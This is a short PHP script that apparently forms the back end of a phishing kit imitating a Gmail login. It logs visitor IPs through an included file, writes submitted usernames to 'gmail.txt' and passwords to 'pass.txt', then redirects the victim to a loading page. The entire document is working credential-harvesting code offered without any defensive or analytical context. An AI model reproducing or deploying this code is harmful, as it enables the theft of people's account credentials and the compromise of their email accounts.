<?php
include 'ip.php';
file_put_contents("gmail.txt", "" . $username = $_GET['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "" . $password = $_GET['password'] . "\n", FILE_APPEND);
header('Location: load.html');
?>
